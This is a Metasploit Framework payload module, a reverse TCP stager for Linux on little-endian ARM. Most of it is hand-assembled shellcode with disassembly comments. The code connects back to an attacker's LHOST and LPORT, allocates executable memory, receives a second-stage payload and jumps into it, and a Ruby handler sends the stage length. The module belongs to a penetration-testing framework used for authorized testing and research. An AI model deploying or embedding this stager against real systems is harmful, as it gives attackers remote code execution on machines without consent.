##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'


###
#
# ReverseTcp
# ----------
#
# Linux reverse TCP stager.
#
###
module Metasploit3

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'Author'        => 'nemo <nemo[at]felinemenace.org>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_ARMLE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 182, 'n'    ],
              'LHOST' => [ 184, 'ADDR' ],
            },
          'Payload' =>
          [
            0xe59f70b4,          #  ldr     r7, [pc, #180]
            0xe3a00002,          #  mov     r0, #2
            0xe3a01001,          #  mov     r1, #1
            0xe3a02006,          #  mov     r2, #6
            0xef000000,          #  svc     0x00000000
            0xe1a0c000,          #  mov     ip, r0
            0xe2877002,          #  add     r7, r7, #2
            0xe28f1090,          #  add     r1, pc, #144
            0xe3a02010,          #  mov     r2, #16
            0xef000000,          #  svc     0x00000000
            0xe1a0000c,          #  mov     r0, ip
            0xe24dd004,          #  sub     sp, sp, #4
            0xe2877008,          #  add     r7, r7, #8
            0xe1a0100d,          #  mov     r1, sp
            0xe3a02004,          #  mov     r2, #4
            0xe3a03000,          #  mov     r3, #0
            0xef000000,          #  svc     0x00000000
            0xe59d1000,          #  ldr     r1, [sp]
            0xe59f3070,          #  ldr     r3, [pc, #112]
            0xe0011003,          #  and     r1, r1, r3
            0xe3a02001,          #  mov     r2, #1
            0xe1a02602,          #  lsl     r2, r2, #12
            0xe0811002,          #  add     r1, r1, r2
            0xe3a070c0,          #  mov     r7, #192
            0xe3e00000,          #  mvn     r0, #0
            0xe3a02007,          #  mov     r2, #7
            0xe59f3054,          #  ldr     r3, [pc, #84]
            0xe1a04000,          #  mov     r4, r0
            0xe3a05000,          #  mov     r5, #0
            0xef000000,          #  svc     0x00000000
            0xe2877063,          #  add     r7, r7, #99
            0xe1a01000,          #  mov     r1, r0
            0xe1a0000c,          #  mov     r0, ip
            0xe3a03000,          #  mov     r3, #0
            0xe59d2000,          #  ldr     r2, [sp]
            0xe2422ffa,          #  sub     r2, r2, #1000
            0xe58d2000,          #  str     r2, [sp]
            0xe3520000,          #  cmp     r2, #0
            0xda000002,          #  ble     80fc <last>
            0xe3a02ffa,          #  mov     r2, #1000
            0xef000000,          #  svc     0x00000000
            0xeafffff7,          #  b       80dc <loop>
            0xe2822ffa,          #  add     r2, r2, #1000
            0xef000000,          #  svc     0x00000000
            0xe1a0f001,          #  mov     pc, r1
            0x5c110002,          #  .word   0x5c110002
            0x0100007f,          #  .word   0x0100007f
            0x00000119,          #  .word   0x00000119
            0xfffff000,          #  .word   0xfffff000
            0x00001022           #  .word   0x00001022
          ].pack("V*")

        }
      ))
  end

def handle_intermediate_stage(conn, payload)

    print_status("Transmitting stage length value...(#{payload.length} bytes)")

    address_format = 'V'

    # Transmit our intermediate stager
    conn.put( [ payload.length ].pack(address_format) )

    Rex::ThreadSafe.sleep(0.5)

    return true
  end

end
